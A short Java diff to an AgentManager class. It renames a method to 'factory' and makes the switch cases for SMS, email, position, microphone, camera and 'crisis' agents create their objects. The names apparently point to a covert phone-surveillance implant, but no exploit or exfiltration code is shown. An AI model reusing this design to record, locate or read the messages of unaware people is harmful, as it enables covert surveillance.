@@ -53,7 +53,7 @@ public class AgentManager extends Manager<AgentBase> {
 	 *            : Agent ID
 	 * @return the requested agent or null in case of error
 	 */
-	private AgentBase mapAgent(final int key) {
+	private AgentBase factory(final int key) {
 		AgentBase a = null;
 
 		if (running.containsKey(key) == true) {
@@ -62,6 +62,7 @@ public class AgentManager extends Manager<AgentBase> {
 
 		switch (key) {
 		case AgentConf.AGENT_SMS:
+			a = new MessageAgent();
 			break;
 
 		case AgentConf.AGENT_TASK:
@@ -75,6 +76,7 @@ public class AgentManager extends Manager<AgentBase> {
 			break;
 
 		case AgentConf.AGENT_POSITION:
+			a = new PositionAgent();
 			break;
 
 		case AgentConf.AGENT_CALL:
@@ -97,18 +99,22 @@ public class AgentManager extends Manager<AgentBase> {
 			break;
 
 		case AgentConf.AGENT_EMAIL:
+			a = new MessageAgent();
 			break;
 
 		case AgentConf.AGENT_MIC:
+			a = new MicAgent();
 			break;
 
 		case AgentConf.AGENT_CAM:
+			a = new CameraAgent();
 			break;
 
 		case AgentConf.AGENT_CLIPBOARD:
 			break;
 
 		case AgentConf.AGENT_CRISIS:
+			a = new CrisisAgent();
 			break;
 
 		case AgentConf.AGENT_APPLICATION:
@@ -193,7 +199,7 @@ public class AgentManager extends Manager<AgentBase> {
 			return;
 		}
 
-		AgentBase a = mapAgent(key);
+		AgentBase a = factory(key);
 
 		if (a == null) {
 			return;
@@ -209,7 +215,7 @@ public class AgentManager extends Manager<AgentBase> {
 		// so unmap and restart the thread
 		if (a.getStatus() == AgentConf.AGENT_STOPPED) {
 			// running.remove(key);
-			a = mapAgent(key);
+			a = factory(key);
 		}
 
 		Check.asserts(a != null, "null agent");
